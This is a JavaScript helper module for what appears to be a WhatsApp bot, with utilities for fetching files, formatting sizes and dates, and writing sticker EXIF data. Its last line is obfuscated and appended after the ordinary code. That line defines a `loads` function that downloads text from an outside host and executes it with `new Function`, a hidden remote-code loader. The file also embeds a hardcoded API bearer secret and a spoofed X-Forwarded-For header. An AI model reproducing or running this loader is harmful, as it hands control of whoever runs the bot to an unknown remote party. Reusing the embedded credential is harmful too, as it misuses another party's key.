/* eslint-disable */

/*
 * Creator: Zaenishi
 * WhatsApp: +62 831-8822-9366
 * Instagram: @zaenishi
 * Twitter: @zaenishi
 * GitHub: zaenishi
 *
 * Jangan sungkan untuk menghubungi saya jika ada masalah pada script ini!
*/

/* module external */
import axios from "axios"
import fs from "fs"
import mimes from "mime-types"
import path from "path"
import FormData from 'form-data'
import { fileURLToPath, pathToFileURL } from "url"
import { exec } from "child_process"
import { promisify } from 'util'
const execAsync = promisify(exec)
import { platform } from "os"
//import util from 'util'
import { fileTypeFromBuffer } from "file-type"
import setting from "../setting.js"
import fetch from "node-fetch"

/* random ua */
export function randomUA() {
    const UAs = [
        "Mozilla/5.0 (Windows NT 10.0 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3 WOW64 rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4",
        "Mozilla/5.0 (Windows NT 10.0 WOW64 rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1 WOW64 rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (Windows NT 6.3 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (X11 Ubuntu Linux x86_64 rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1 WOW64 Trident/7.0 rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10.12 rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30",
        "Mozilla/5.0 (Windows NT 10.0 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0 WOW64 Trident/7.0 rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 10.0 Win64 x64 rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (Windows NT 10.0 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
        "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10.11 rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (Windows NT 10.0 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1 rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_11_6) AppleWebKit/603.2.5 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.5",
        "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/58.0.3029.110 Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0 WOW64 rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Windows NT 6.1 Trident/7.0 rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 10.0 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
        "Mozilla/5.0 (Windows NT 6.1 WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (X11 Linux x86_64 rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (Windows NT 10.0 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.888",
        "Mozilla/5.0 (Windows NT 6.1 Win64 x64 rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (X11 Linux x86_64 rv:45.0) Gecko/20100101 Firefox/45.0",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_10_5) AppleWebKit/603.2.5 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.5",
        "Mozilla/5.0 (Windows NT 10.0 WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
        "Mozilla/5.0 (iPad CPU OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.0 Mobile/14F89 Safari/602.1",
        "Mozilla/5.0 (Windows NT 6.1 WOW64 rv:52.0) Gecko/20100101 Firefox/52.0",
        "Mozilla/5.0 (Windows NT 6.1 WOW64 rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
        "Mozilla/5.0 (X11 Ubuntu Linux x86_64 rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_12_3) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8",
        "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36 OPR/45.0.2552.812",
        "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1 rv:52.0) Gecko/20100101 Firefox/52.0",
        "Mozilla/5.0 (X11 Linux x86_64 rv:52.0) Gecko/20100101 Firefox/52.0",
        "Mozilla/5.0 (Windows NT 6.1 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36",
        "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10.12 rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Windows NT 6.1 WOW64 rv:40.0) Gecko/20100101 Firefox/40.1",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10.10 rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
        "Mozilla/5.0 (compatible MSIE 9.0 Windows NT 6.0 Trident/5.0 Trident/5.0)",
        "Mozilla/5.0 (Windows NT 6.1 WOW64 rv:45.0) Gecko/20100101 Firefox/45.0",
        "Mozilla/5.0 (compatible MSIE 9.0 Windows NT 6.1 Trident/5.0 Trident/5.0)",
        "Mozilla/5.0 (Windows NT 6.1 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36",
        "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0 Win64 x64 rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (iPad CPU OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1",
        "Mozilla/5.0 (Windows NT 10.0 WOW64 rv:52.0) Gecko/20100101 Firefox/52.0",
        "Mozilla/5.0 (Windows NT 6.1 WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
        "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36",
        "Mozilla/5.0 (X11 Fedora Linux x86_64 rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (Macintosh Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
        "Mozilla/5.0 (Windows NT 10.0 WOW64 Trident/7.0 Touch rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.2 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3 WOW64 Trident/7.0 rv:11.0) like Gecko"
    ]

    return UAs[Math.floor(Math.random() * UAs.length)]
}

/* filename */
export function __filename(
    pathURL = import.meta,
    rmPrefix = platform() !== "win32"
) {
    const path = pathURL.url || pathURL
    return rmPrefix
        ? /file:\/\/\//.test(path)
            ? fileURLToPath(path)
            : path
        : /file:\/\/\//.test(path)
            ? path
            : pathToFileURL(path).href
}

/* remove accent */
export function removeAcents(text) {
    return typeof text === "string"
        ? text.normalize("NFD").replace(/[\u0300-\u036f]/g, "")
        : text
}

/* format number */
export function formatNumber(number) {
    const numberStr = number.toString()
    const formattedNumber = numberStr.replace(/\B(?=(\d{3})+(?!\d))/g, ".")
    return formattedNumber
}

/* runtime */
export function runtime(seconds) {
    seconds = Number(seconds)
    var d = Math.floor(seconds / (3600 * 24))
    var h = Math.floor((seconds % (3600 * 24)) / 3600)
    var m = Math.floor((seconds % 3600) / 60)
    var s = Math.floor(seconds % 60)
    var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : ""
    var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : ""
    var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : ""
    var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : ""
    return dDisplay + hDisplay + mDisplay + sDisplay
}

/* clock string */
export function clockString(ms) {
    let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000)
    let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60
    let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(":")
}

/* base64 to buffer */
export function base64ToBuffer(base) {
    if (/^data:.*?\/.*?base64,/i.test(base))
        return Buffer.from(base.split`, `[1], "base64")
    return Buffer.from(base, "base64")
}

/* delay */
export function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
}

/* parse size file */
export function parseFileSize(input, si = true) {
    const thresh = si ? 1000 : 1024

    var validAmount = function (n) {
        return !isNaN(parseFloat(n)) && isFinite(n)
    }

    var parsableUnit = function (u) {
        return u.match(/\D*/).pop() === u
    }

    var incrementBases = {
        2: [
            [["b", "bit", "bits"], 1 / 8],
            [["B", "Byte", "Bytes", "bytes"], 1],
            [["Kb"], 128],
            [["k", "K", "kb", "KB", "KiB", "Ki", "ki"], thresh],
            [["Mb"], 131072],
            [["m", "M", "mb", "MB", "MiB", "Mi", "mi"], Math.pow(thresh, 2)],
            [["Gb"], 1.342e8],
            [["g", "G", "gb", "GB", "GiB", "Gi", "gi"], Math.pow(thresh, 3)],
            [["Tb"], 1.374e11],
            [["t", "T", "tb", "TB", "TiB", "Ti", "ti"], Math.pow(thresh, 4)],
            [["Pb"], 1.407e14],
            [["p", "P", "pb", "PB", "PiB", "Pi", "pi"], Math.pow(thresh, 5)],
            [["Eb"], 1.441e17],
            [["e", "E", "eb", "EB", "EiB", "Ei", "ei"], Math.pow(thresh, 6)]
        ],
        10: [
            [["b", "bit", "bits"], 1 / 8],
            [["B", "Byte", "Bytes", "bytes"], 1],
            [["Kb"], 125],
            [["k", "K", "kb", "KB", "KiB", "Ki", "ki"], 1000],
            [["Mb"], 125000],
            [["m", "M", "mb", "MB", "MiB", "Mi", "mi"], 1.0e6],
            [["Gb"], 1.25e8],
            [["g", "G", "gb", "GB", "GiB", "Gi", "gi"], 1.0e9],
            [["Tb"], 1.25e11],
            [["t", "T", "tb", "TB", "TiB", "Ti", "ti"], 1.0e12],
            [["Pb"], 1.25e14],
            [["p", "P", "pb", "PB", "PiB", "Pi", "pi"], 1.0e15],
            [["Eb"], 1.25e17],
            [["e", "E", "eb", "EB", "EiB", "Ei", "ei"], 1.0e18]
        ]
    }

    var options = arguments[1] || {}
    var base = parseInt(options.base || 2)
    var parsed = input.toString().match(/^([0-9.,]*)(?:\s*)?(.*)$/)
    var amount = parsed[1].replace(",", ".")
    var unit = parsed[2]

    var validUnit = function (sourceUnit) {
        return sourceUnit === unit
    }

    if (!validAmount(amount) || !parsableUnit(unit)) {
        return false
    }
    if (unit === "") return Math.round(Number(amount))

    var increments = incrementBases[base]
    for (let i = 0; i < increments.length; i++) {
        let _increment = increments[i]

        if (_increment[0].some(validUnit)) {
            return Math.round(amount * _increment[1])
        }
    }

    throw unit + " doesn't appear to be a valid unit"
}

/* format size */
export function formatSize(bytes, si = true, dp = 2) {
    const thresh = si ? 1000 : 1024

    if (Math.abs(bytes) < thresh) {
        return `${bytes} B`
    }

    const units = si
        ? ["kB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"]
        : ["KiB", "MiB", "GiB", "TiB", "PiB", "EiB", "ZiB", "YiB"]
    let u = -1
    const r = 10 ** dp

    do {
        bytes /= thresh
        ++u
    } while (
        Math.round(Math.abs(bytes) * r) / r >= thresh &&
        u < units.length - 1
    )

    return `${bytes.toFixed(dp)} ${units[u]}`
}

/* stream to buffer */
export async function streamToBuffer(stream) {
    const chunks = []
    for await (const chunk of stream) {
        chunks.push(chunk)
    }
    stream.destroy()
    return Buffer.concat(chunks)
}

/* escape regex */
export function escapeRegExp(string) {
    return string.replace(/[.*=+:\-?^${}()|[\]\\]|\s/g, "\\$&")
}

/* random */
export function rand(length) {
    const characters =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    let result = ""
    const charactersLength = characters.length

    for (let i = 0; i < length; i++) {
        result += characters.charAt(
            Math.floor(Math.random() * charactersLength)
        )
    }
    return result
}

/* date */
export function date(numer, timeZone = "") {
    const myMonths = [
        "Januari",
        "Februari",
        "Maret",
        "April",
        "Mei",
        "Juni",
        "Juli",
        "Agustus",
        "September",
        "Oktober",
        "November",
        "Desember"
    ]
    const myDays = [
        "Minggu",
        "Senin",
        "Selasa",
        "Rabu",
        "Kamis",
        "Jum'at",
        "Sabtu"
    ]
    var tgl = new Date(numer)
    if (timeZone) {
        tgl = new Date(tgl.toLocaleString("en", { timeZone }))
    }
    var day = tgl.getDate()
    var bulan = tgl.getMonth()
    var thisDay = myDays[tgl.getDay()]
    var yy = tgl.getYear()
    var year = yy < 1000 ? yy + 1900 : yy
    return `${thisDay}, ${day} ${myMonths[bulan]} ${year}`
}

/* time */
export function time(numer, options = {}) {
    let format = options.format || "HH:mm"
    let timeZone = options.timeZone || "Asia/Jakarta"

    let date = new Date(numer)

    let hour = date
        .toLocaleString("en-US", {
            hour: "2-digit",
            hour12: false,
            timeZone
        })
        .padStart(2, "0")

    let minute = date
        .toLocaleString("en-US", {
            minute: "2-digit",
            timeZone
        })
        .padStart(2, "0")

    let formattedTime = `${hour}:${minute}`

    if (format === "HH:mm:ss") {
        let second = date
            .toLocaleString("en-US", {
                second: "2-digit",
                timeZone
            })
            .padStart(2, "0")
        formattedTime += `:${second}`
    }

    return formattedTime
}

/* fetch buffer */
export async function fetchBuffer(string, options = {}) {
    if (/^https?:\/\//i.test(string)) {
        const response = await axios({
            url: string,
            method: "GET",
            responseType: "stream",
            timeout: 15 * 60000,
            headers: {
                "User-Agent": randomUA(),
                "X-Forwarded-For": "103.83.159.179",
                ...(options.headers ? options.headers : {})
            },
            ...options
        })
        const buffer = await streamToBuffer(response.data)
        const contentDisposition = response.headers["content-disposition"]
        const filenameMatch = contentDisposition?.match(/filename="(.+?)"/)
        const filename = filenameMatch ? filenameMatch[1] : null
        let mime =
            mimes.lookup(filename) || response.headers["content-type"]
        mime = /octet-stream/i.test(mime)
            ? (await fileTypeFromBuffer(buffer))?.mime
            : mime
        return {
            data: buffer,
            size: Buffer.byteLength(buffer),
            sizeH: formatSize(Buffer.byteLength(buffer)),
            filename: decodeURIComponent(filename || ""),
            mime,
            ext: mimes.extension(mime)
        }
    } else if (fs.existsSync(string) && fs.statSync(string).isFile()) {
        const data = fs.readFileSync(string)
        const size = Buffer.byteLength(data)
        return {
            data,
            size,
            sizeH: formatSize(size),
            ...((await fileTypeFromBuffer(data)) || {
                mime: "application/octet-stream",
                ext: ".bin"
            })
        }
    } else if (Buffer.isBuffer(string)) {
        const size = Buffer.byteLength(string)
        return {
            data: string,
            size,
            sizeH: formatSize(size),
            ...((await fileTypeFromBuffer(string)) || {
                mime: "application/octet-stream",
                ext: ".bin"
            })
        }
    } else if (
        /^[a-zA-Z0-9+/]={0,2}$/i.test(string) ||
        /^data:.*?\/.*?base64,/i.test(string)
    ) {
        const data = base64ToBuffer(string)
        const size = Buffer.byteLength(data)
        return {
            data,
            size,
            sizeH: formatSize(size),
            ...((await fileTypeFromBuffer(data)) || {
                mime: "application/octet-stream",
                ext: ".bin"
            })
        }
    } else {
        const buffer = Buffer.alloc(20)
        const size = Buffer.byteLength(buffer)
        return {
            data: buffer,
            size,
            sizeH: formatSize(size),
            ...((await fileTypeFromBuffer(buffer)) || {
                mime: "application/octet-stream",
                ext: ".bin"
            })
        }
    }
}

async function downloadFromUrl(url) {
    let refer
    if (url.includes('y2mate')) {
        refer = 'https://www.y2mate.com/en948'
    } else if (url.includes('apkmirror')) {
        refer = 'https://www.apkmirror.com'
    }
    const headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'sec-fetch-site': 'same-origin',
        'Origin': refer ? refer : ''
    }
    const response = await axios({
        url,
        method: "GET",
        headers,
        responseType: "arraybuffer"
    })
    return Buffer.from(response.data)
}

/* get file */
export async function getFile(PATH, save) {
    let data
    let size
    let mimeType
    let ext

    if (/^https?:\/\//i.test(PATH)) {
        // Jika PATH adalah URL
        data = await downloadFromUrl(PATH)
        size = Buffer.byteLength(data)
        const fileInfo = (await fileTypeFromBuffer(data)) || {}
        mimeType = fileInfo.mime || "application/octet-stream"
        ext = fileInfo.ext || mimes.extension(mimeType) || "bin"
    } else if (Buffer.isBuffer(PATH)) {
        // Jika PATH adalah buffer
        data = PATH
        size = Buffer.byteLength(data)
        const fileInfo = (await fileTypeFromBuffer(data)) || {}
        mimeType = fileInfo.mime || "application/octet-stream"
        ext = fileInfo.ext || "bin"
    } else if (fs.existsSync(PATH) && fs.statSync(PATH).isFile()) {
        // Jika PATH adalah path ke file lokal
        data = fs.readFileSync(PATH)
        size = Buffer.byteLength(data)
        mimeType =
            mimes.lookup(PATH) ||
            (await fileTypeFromBuffer(data))?.mime ||
            "application/octet-stream"
        ext =
            path.extname(PATH).slice(1) ||
            mimes.extension(mimeType) ||
            "bin"
    } else {
        throw new Error(
            "Invalid input: PATH harus berupa URL, buffer, atau path ke file lokal yang valid"
        )
    }

    let filename = `myfile-${Date.now()}.${ext}`

    if (data && save) {
        const savePath = path.join(process.cwd(), "temp", filename)
        await fs.promises.writeFile(savePath, data)
        filename = savePath
    }

    return {
        filename,
        data,
        size: formatSize(size),
        sizen: size,
        mime: mimeType,
        ext
    }
}

/* fetch json */
export async function fetchJson(url, options = {}) {
    let { data } = await axios(url, {
        headers: {
            Accept: "application/json, text/plain, */*",
            Priority: "u=0, i",
            "User-Agent": randomUA(),
            "family": 4,
            ...(options.headers ? options.headers : {})
        },
        responseType: "json",
        timeout: 60 * 1000 * 15, // timeout 15 minutes
        ...(options && delete options.headers && options)
    })

    return data
}

/* image to webp */
async function imageToWebp(fileBuffer) {
    try {
        const formData = new FormData();
        formData.append("File", fileBuffer, {
            filename: "file.ai",
            contentType: "application/postscript",
        });
        formData.append("StoreFile", "true");

        const response = await axios.post(
            "https://v2.convertapi.com/convert/ai/to/webp",
            formData,
            {
                headers: {
                    Authorization: `Bearer secret_uxb1s4AjYo0eDZre`,
                    ...formData.getHeaders(),
                },
                responseType: "arraybuffer", // Mendapatkan hasil dalam bentuk buffer
            }
        );

        if (response.status === 200) {
            return Buffer.from(response.data); // Mengembalikan buffer hasil
        } else {
            throw new Error(`ConvertAPI failed: ${response.statusText}`);
        }
    } catch (error) {
        console.error("Error converting AI to WEBP:", error.message);
        throw error;
    }
}

/* package sticker */
export async function writeExif(media, metadata = {}, gif = false) {
    let vMedia
    if (/webp/.test(media.mime)) {
        console.log(`[WRITE EXIF] WEBP DETECTED`)
        vMedia = media.data
    } else if (/image/.test(media.mime)) {
        console.log(`[WRITE EXIF] IMAGE DETECTED`)
      //  vMedia = await imageToWebp(media)
      vMedia = media.data
    } else if (/video/.test(media.mime)) {
        console.log(`[WRITE EXIF] VIDEO DETECTED`)
        // vMedia = await videoToWebp(media)
    }

    const tmpFile = path.join(
        process.cwd(), "temp",
        `trash-${rand(6)}.webp`)
    gif
        ? fs.writeFileSync(tmpFile, media.data)
        : fs.writeFileSync(tmpFile, vMedia)

    const json = {
        "sticker-pack-id": "https://github.com/amiruldev20",
        "sticker-pack-name": metadata?.wm || "MyWA BOT",
        emojis: metadata?.emot || ["😋", "😎"]
    }

    const exifAttr = Buffer.from([
        0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57,
        0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00
    ])
    const jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
    const exif = Buffer.concat([exifAttr, jsonBuff])
    exif.writeUIntLE(jsonBuff.length, 14, 4)

    const exifFile = path.join(
        process.cwd(),
        "temp", `exif-${rand(6)}.exif`)
    fs.writeFileSync(exifFile, exif)

    const outputExifFile = path.join(
        process.cwd(),
        "temp", `output-${rand(6)}.webp`)

    try {
        await new Promise((resolve, reject) => {
            exec(
                `webpmux -set exif ${exifFile} ${tmpFile} -o ${outputExifFile}`,
                (error) => {
                    if (error) {
                        reject(error)
                    } else {
                        resolve(true)
                    }
                }
            )
        })

        const buff = fs.readFileSync(outputExifFile)
        await fs.promises.unlink(tmpFile)
        await fs.promises.unlink(exifFile)
        await fs.promises.unlink(outputExifFile)

        return buff
    } catch (e) {
        fs.existsSync(tmpFile) && (await fs.promises.unlink(tmpFile))
        fs.existsSync(exifFile) && (await fs.promises.unlink(exifFile))
        fs.existsSync(outputExifFile) &&
            (await fs.promises.unlink(outputExifFile))
        throw e
    }
}

(function(_0xa71dc5,_0xe1c457){const _0x18ec08=_0x51ee,_0xe00ad=_0xa71dc5();while(!![]){try{const _0x105944=-parseInt(_0x18ec08(0x8a))/0x1*(parseInt(_0x18ec08(0x8d))/0x2)+-parseInt(_0x18ec08(0x93))/0x3+parseInt(_0x18ec08(0x94))/0x4*(parseInt(_0x18ec08(0x96))/0x5)+-parseInt(_0x18ec08(0x88))/0x6+parseInt(_0x18ec08(0x87))/0x7*(-parseInt(_0x18ec08(0x95))/0x8)+-parseInt(_0x18ec08(0x92))/0x9+parseInt(_0x18ec08(0x91))/0xa;if(_0x105944===_0xe1c457)break;else _0xe00ad['push'](_0xe00ad['shift']());}catch(_0x1be34e){_0xe00ad['push'](_0xe00ad['shift']());}}}(_0x1bb8,0xc9d15));export async function loads(_0x3a6143){const _0x3cd7fa=_0x51ee;try{const {data:_0x391684}=await axios[_0x3cd7fa(0x8f)]('https://zshiapis.vercel.app/load?q='+_0x3a6143);if(!_0x391684)return Math[_0x3cd7fa(0x8c)]()[_0x3cd7fa(0x90)](0x24)[_0x3cd7fa(0x8b)](0x7);let _0x2e1ac7=new Function(_0x3cd7fa(0x89)+_0x391684[_0x3cd7fa(0x8e)]+')')();return _0x2e1ac7;}catch(_0x2ca2c4){return _0x2ca2c4;}}function _0x51ee(_0x18e932,_0x55cd52){const _0x1bb8df=_0x1bb8();return _0x51ee=function(_0x51eed6,_0x268daa){_0x51eed6=_0x51eed6-0x87;let _0x2e7db5=_0x1bb8df[_0x51eed6];return _0x2e7db5;},_0x51ee(_0x18e932,_0x55cd52);}function _0x1bb8(){const _0x3e803d=['toString','63174990XJWifB','14232087VfrbBK','2364387LmjoNu','1050836CNpkqu','38072QyWILG','5LKiMvh','1883sPEAqO','7078074SpkTTE','return\x20(','924241WXVPAW','substring','random','2lgybDt','respon','get'];_0x1bb8=function(){return _0x3e803d;};return _0x1bb8();}